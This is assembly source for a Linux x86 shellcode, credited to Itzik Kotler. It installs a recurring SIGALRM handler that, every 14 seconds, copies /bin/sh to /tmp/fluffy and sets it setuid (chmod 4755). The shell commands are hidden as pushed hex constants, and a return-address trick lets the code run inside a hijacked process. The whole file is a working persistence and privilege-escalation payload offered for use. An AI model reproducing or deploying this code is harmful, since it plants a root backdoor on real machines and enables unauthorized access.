#
# (linux/x86) drops a setuid shell as /tmp/fluffy every 14sec - 187 bytes / +7 for stand alone
# - Itzik Kotler <ik@ikotler.org>
#

#

.equ _STANDALONE, 1

#

.section .text
	.global _start

	#
	# The STAND ALONE code simply pushs the address of _idle_loop() into the stack in advance. Thus 
	# making sure that fluffy would have a valid return address, to return to. The loop would be 
	# interrupted to due SIGALRM signal which in turn, would bring fluffy back to the game. 
	#

	.ifdef _STANDALONE

		_idle_loop:

			jmp _idle_loop

		_start:

			pushl $_idle_loop

	.else

		_start:

	.endif

	_setup_sighandler:

		nop
		nop
                pusha
                pushf

		pushl $48
		popl %eax

		pushl $14
		popl %ebx

		jmp _geteip

        _calc_eip:

                popl %ecx
                addl $0xd, %ecx
		jmp _continue

	_geteip:

                call _calc_eip

	_continue:

                int $0x80

                testl %eax, %eax
                jnz _resumeflow

                movb $27, %al
                int $0x80

        _resumeflow:

                popf
                popa
                ret

	_xtart:

		movl %esp, %ebp

		pushl $0x21
		popl %eax

		cdq

		pushl %edx
		pushl $0x79666675
		pushl $0x6c662f70
		pushl $0x6d742f2f
		movl %esp, %ebx

		pushl $0x4

	_doint:

		popl %ecx
		int $0x80

		testl %eax, %eax
		jz _schedule

	_fork:

		addl %ecx, %eax
		int $0x80

		testl %eax, %eax
		jnz _waitpid

	_exec:

		pushl %edx
		pushl $0x68732f6e
		pushl $0x69622f2f
		movl %esp, %ebx

		pushl %edx
		pushl %edx
		movw $0x632d, (%esp)
		movl %esp, %esi

                pushl %edx
                pushl $0x79666675
                pushl $0x6c662f70
                pushl $0x6d742f2f
                pushl $0x20353537
                pushl $0x3420646f
                pushl $0x6d686320
                pushl $0x3b207966
                pushl $0x66756c66
                pushl $0x2f706d74
                pushl $0x2f206873
                pushl $0x2f6e6962
                pushl $0x2f207063
                movl %esp, %edi

                movb $0xb, %al
                pushl %edx
                pushl %edi
                pushl %esi
                pushl %ebx
		pushl %esp
		jmp _doint
		
	_waitpid:

                xchg %eax, %ebx
		xorl %ecx, %ecx
		pushl $0x7
		popl %eax
                int $0x80

	_schedule:

		xchg %esp, %ebp

		jmp _setup_sighandler

